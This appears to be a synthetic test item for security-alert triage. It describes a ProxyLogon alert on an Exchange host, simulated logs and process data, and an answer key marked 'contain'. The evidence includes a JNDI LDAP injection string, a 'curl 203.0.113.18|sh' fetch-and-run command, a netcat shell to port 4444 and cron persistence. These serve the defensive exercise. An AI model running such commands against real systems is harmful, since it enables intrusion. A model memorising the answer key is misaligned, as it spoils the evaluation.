@@ -1,0 +1,78 @@
+{
+  "id": "A-1013",
+  "alert": {
+    "src": "203.0.113.18",
+    "dst": "10.2.7.162",
+    "dst_port": 443,
+    "proto": "tcp",
+    "signature": "ET EXPLOIT ProxyLogon SSRF",
+    "claimed_cve": "CVE-2021-26855",
+    "severity": "high",
+    "ts": "2026-09-16T09:39:00Z",
+    "flow_id": "f7304"
+  },
+  "world": {
+    "assets": {
+      "10.2.7.162": {
+        "host": "host-10-2-7-162",
+        "os": "linux",
+        "criticality": "high",
+        "owner": "platform-team",
+        "services": {
+          "443": {
+            "product": "microsoft-exchange",
+            "version": "15.2.791"
+          }
+        },
+        "peers": [
+          "10.2.5.151"
+        ]
+      }
+    },
+    "cves": {
+      "CVE-2021-26855": {
+        "product": "microsoft-exchange",
+        "patched_in": "15.2.792",
+        "exploit_maturity": "weaponized"
+      }
+    },
+    "flows": {
+      "f7304": {
+        "direction": "outbound",
+        "bytes_out": 84213,
+        "bytes_in": 512,
+        "duration_s": 604,
+        "state": "ESTABLISHED",
+        "note": "periodic 60s beacon to external host"
+      }
+    },
+    "logs": {
+      "host-10-2-7-162": [
+        "[host-10-2-7-162] 443 POST /api/x 200 jndi:ldap://203.0.113.18/a  <- payload accepted",
+        "[host-10-2-7-162] spawned /bin/sh from service process"
+      ]
+    },
+    "proc_trees": {
+      "host-10-2-7-162": {
+        "suspicious": true,
+        "tree": "java -> sh -c 'curl 203.0.113.18|sh' -> nc 203.0.113.18 4444",
+        "persistence": "cron @reboot /tmp/.beacon"
+      }
+    },
+    "sessions": [
+      {
+        "src": "203.0.113.18",
+        "dst": "10.2.7.162",
+        "port": 443,
+        "legit": false
+      }
+    ],
+    "firewall": []
+  },
+  "ground_truth": {
+    "verdict": "SUCCEEDED",
+    "action": "contain"
+  },
+  "adversarial": false,
+  "solve_rationale": "vulnerable version + shell spawned + outbound beacon"
+}
